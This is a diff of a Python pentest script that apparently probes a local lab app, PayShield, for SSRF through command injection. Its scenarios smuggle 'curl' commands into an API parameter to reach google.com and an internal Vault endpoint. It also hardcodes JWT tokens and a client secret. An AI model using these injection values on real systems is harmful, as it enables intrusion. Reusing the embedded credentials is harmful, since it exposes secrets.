@@ -1,55 +1,80 @@
 import requests
-import urllib3
 import time
-from collections import defaultdict
+import uuid
+import hmac
+import hashlib
+import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-URL = "https://localhost:8888/api"
+# --- CONFIGURATION ---
+BASE_URL = "https://localhost:8888"
+# Thay token vào đây
+TOKEN = "eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJIbDVqRUNMbGxic29pTkp1ZUVGV3BaVnlhcldFeGxHNFBKVE54QnloN2tBIn0.eyJleHAiOjE3Nzc5MDQ4ODEsImlhdCI6MTc3NzkwNDU4MSwiYXV0aF90aW1lIjoxNzc3OTA0NTgwLCJqdGkiOiI2Mzg2Nzg5MS1mNTU2LTQ2MDctYjU0OS1lNzZmMGMwZjg4ZjIiLCJpc3MiOiJodHRwczovL2xvY2FsaG9zdDo4NDQ0L3JlYWxtcy9wYXlzaGllbGQtcmVhbG0iLCJzdWIiOiJmMjhkMmIzZi0wM2U4LTRjZDAtOWExNi03Njc3MGNlNjc5ZmQiLCJ0eXAiOiJCZWFyZXIiLCJhenAiOiJwYXlzaGllbGQtYXBwIiwic2Vzc2lvbl9zdGF0ZSI6IjBjNzk3ZTAzLWU1YmQtNGYwYi04ZjJmLTAzZGEyZjBkYTA2YiIsImFjciI6IjEiLCJhbGxvd2VkLW9yaWdpbnMiOlsiaHR0cHM6Ly9vYXV0aC5wc3Rtbi5pbyIsImh0dHBzOi8vbG9jYWxob3N0Ojg4ODgiXSwicmVhbG1fYWNjZXNzIjp7InJvbGVzIjpbIm1hbmFnZXIiXX0sImNuZiI6eyJ4NXQjUzI1NiI6Ikc2QkRiNUZ0TF9sM21XZEhWVFI3ZE81WDZvODNySWpwclljdTFfQmtIREkifSwic2NvcGUiOiJvcGVuaWQgcHJvZmlsZSBlbWFpbCIsInNpZCI6IjBjNzk3ZTAzLWU1YmQtNGYwYi04ZjJmLTAzZGEyZjBkYTA2YiIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJuYW1lIjoiSHVuZyBOZ3V5ZW4iLCJwcmVmZXJyZWRfdXNlcm5hbWUiOiJtYW5hZ2VyLWV4YW1wbGVAcGF5c2hpZWxkLmNvbSIsImdpdmVuX25hbWUiOiJIdW5nIiwiZmFtaWx5X25hbWUiOiJOZ3V5ZW4iLCJlbWFpbCI6Im1hbmFnZXItZXhhbXBsZUBwYXlzaGllbGQuY29tIn0.RP8EK7iVRSBMJd_iM5ukbco6EI-4KGlkASZv99Z_xgitFBd42dBmsooWoq8VhRqEGQRglw5JpH-GJ6jaMfXTnlygsuif0EcLtEiE1D1aCwLpRgK9jnkqKnNcaulGPou6zgJwttaQwshzBkUDDb5OlWOvBoMWSCiRzinVcYlv138bcgShNsc6SKQ7yij_yfjsIpNWsJqT_vlHiPuCunko-DRrQ5-w_wWPOPm_3TN99CyENW340L19hMOaeJhqLQpc7Fl2mErwOZnRBRGM0ndhU0_ihITk5HOZZv64_Wnnt-c9qtYppUk9DOZ8-bNVZ6jTvVF7XU2Gq3AnwI4c3P1knA"
+# Thay client secret vào đây
+SECRET = "HoHjwBR7aSEJtzQ1DylcppVxZ4CWnVmQ" 
 
-TOKEN = "eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJIbDVqRUNMbGxic29pTkp1ZUVGV3BaVnlhcldFeGxHNFBKVE54QnloN2tBIn0.eyJleHAiOjE3NzY2OTU2MTgsImlhdCI6MTc3NjY5NTMxOCwiYXV0aF90aW1lIjoxNzc2Njg5NTQwLCJqdGkiOiIyNmUwNWEzMi00OWY4LTRhNDItOTE2OC1hMGNjMTI2NGVkMDMiLCJpc3MiOiJodHRwczovL2xvY2FsaG9zdDo4NDQ0L3JlYWxtcy9wYXlzaGllbGQtcmVhbG0iLCJzdWIiOiJiZWJiNjk1NC0wZTBmLTQ3ZmMtODkzZS0yNmFmZGY1NjYyNmEiLCJ0eXAiOiJCZWFyZXIiLCJhenAiOiJwYXlzaGllbGQtYXBwIiwic2Vzc2lvbl9zdGF0ZSI6IjQwZTBjMDFkLTkxZjEtNGM1Ni04NjBiLTUzOTI4ZDdjY2FiOCIsImFjciI6IjEiLCJhbGxvd2VkLW9yaWdpbnMiOlsiaHR0cDovL2xvY2FsaG9zdDo2ODY4IiwiaHR0cHM6Ly9vYXV0aC5wc3Rtbi5pbyIsImh0dHBzOi8vbG9jYWxob3N0Ojg4ODgiXSwicmVhbG1fYWNjZXNzIjp7InJvbGVzIjpbImVtcGxveWVlIl19LCJjbmYiOnsieDV0I1MyNTYiOiJwVXFsaU50U3hGckl2LUgyQ01xMVNsYTFMekhMLW9xZHYxbkZtV1JQclYwIn0sInNjb3BlIjoib3BlbmlkIHByb2ZpbGUgZW1haWwiLCJzaWQiOiI0MGUwYzAxZC05MWYxLTRjNTYtODYwYi01MzkyOGQ3Y2NhYjgiLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwibmFtZSI6Ikh1bmcgTmd1eWVuIiwicHJlZmVycmVkX3VzZXJuYW1lIjoiZW1wbG95ZWUtZXhhbXBsZUBwYXlzaGllbGQuY29tIiwiZ2l2ZW5fbmFtZSI6Ikh1bmciLCJmYW1pbHlfbmFtZSI6Ik5ndXllbiIsImVtYWlsIjoiZW1wbG95ZWUtZXhhbXBsZUBwYXlzaGllbGQuY29tIn0.ebI1VmwOdrcIR2i5cNx4rySPzm-dtuGNv72-LRrTEksG1lXSINtZcuMN6eeIXy3ZCYzBoDyvO1QQ2KSgnmGC9gScdj4P00hf5XvKRca9d3cWVuRD42cQN26XEaay4LKosnA1ybLUspFzvspL-roHEdpadfrhKtzlsEVT7zUlPQd-lDayEIViizjWI5wJ_MnVkisFGUqPP5P4m-EQBbLq5Ba05QR03Bqx1kFN6Xh4FJP4RC1TkQqUMhHcRxr1_9oDA1DAqLGZ7gmwPfj2pNar4nLFymgQNFaki5GJdVSai3tlfgDGdTpd8Jo3RjI_BBqGIvtDyEG5T1rrsRzJdE7vnQ" 
+CA = 'kms/ca.crt'
+CLIENT = ('kms/client.crt', 'kms/client.key')
 
-CERT = ('services/cert/client.crt', 'services/key/client.key')
+def payload(method, uri, ts, nonce, token, secret):
+    payload_str = f"{method}|{uri}|{ts}|{nonce}|{token}"
+    return hmac.new(secret.encode(), payload_str.encode(), hashlib.sha256).hexdigest()
 
-HEADERS = {"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"}
-
-PAYLOADS = [
-    {"name": "Webhook-Forgery", "target": "https://facebook.com"}
-]
-
-def ssrf_attack():
-    stats = defaultdict(int)
-    print("=== SSRF ATTACK & WEBHOOK FORGERY ===")
-
-    for attack in PAYLOADS:
+def send(label, method, uri, use_mtls=True, json_data=None):
+    print(f"\n--- {label} ---")
+    
+    ts = str(int(time.time()))
+    nonce = str(uuid.uuid4())
+    sig = payload(method, uri, ts, nonce, TOKEN, SECRET)
+    
+    headers = {
+        "Authorization": f"Bearer {TOKEN}",
+        "X-Timestamp": ts,
+        "X-Nonce": nonce,
+        "X-Signature": sig,
+        "Content-Type": "application/json"
+    }
+    
+    url = f"{BASE_URL}{uri}"
+    print(f"Target: {method} {uri}")
+    
+    cert = CLIENT if use_mtls else None
+    
+    try:
+        response = requests.request(method, url, headers=headers, json=json_data, cert=cert, verify=False, timeout=7)
+        print(f"Status: {response.status_code}")
+        preview = response.text[:150] + ("..." if len(response.text) > 150 else "")
+        print(f"Response: {preview}")
         
-        endpoints = [
-            f"{URL}/dashboard/dashboard-employee?url={attack['target']}" 
-        ]
+        if response.status_code == 200 and len(response.text) > 0:
+            print("[!] POTENTIAL SSRF VULNERABILITY CONFIRMED! <<<")
+            
+    except requests.exceptions.SSLError as e:
+        print(f"❌ SSL Error: Khả năng cao do mTLS bị từ chối - {e}")
+    except requests.exceptions.Timeout:
+        print("❌ Error: Request Timed Out (Có thể mục tiêu nội bộ không phản hồi)")
+    except Exception as e:
+        print(f"❌ Error: {e}")
 
-        for url in endpoints:
-            try:
-                response = requests.get(url, headers=HEADERS, cert=CERT, verify=False, timeout=5)
-                stats[response.status_code] += 1
+# SCENARIO 1: OOB SSRF 
+send(
+    label="SCENARIO 1: OOB SSRF", 
+    method="GET", 
+    uri="/api/employees?ip=127.0.0.1;curl -I https://google.com"
+)
 
-                if response.status_code == 200:
-                    print(f"  [!] SSRF DETECTED: {attack['target']}")
-                    if "QlyLuong" in response.text: 
-                        print("  [!!] Dữ liệu nội bộ bị rò rỉ!")
-                elif response.status_code == 500:
-                    print(f"  [?] Lỗi server")
-                elif response.status_code == 403:
-                    print(f"  [+] Chặn SSRF thành công !")
-                else:
-                    print(f"  [-] Phản hồi khác: HTTP {response.status_code}")
-                    
-            except requests.exceptions.Timeout:
-                stats["Timeout"] += 1
-            except Exception as e:
-                stats["Error"] += 1
+# SCENARIO 2: INTERNAL SERVICE 
+send(
+    label="SCENARIO 2: SSRF TO HASHICORP VAULT", 
+    method="GET", 
+    uri="/api/employees?ip=127.0.0.1;curl -s -k https://payshield_vault:8200/v1/sys/health"
+)
 
-    print(f"\n--- KẾT QUẢ ---")
-    for code, count in stats.items():
-        print(f"Mã HTTP {code}: {count} lần")
-
-ssrf_attack()
+# SCENARIO 3: SSRF WITHOUT mTLS 
+send(
+    label="SCENARIO 6: SSRF ATTEMPT WITHOUT mTLS", 
+    method="GET", 
+    uri="/api/employees?ip=127.0.0.1;curl -s -k https://payshield_vault:8200/v1/sys/health",
+    use_mtls=False
+)   
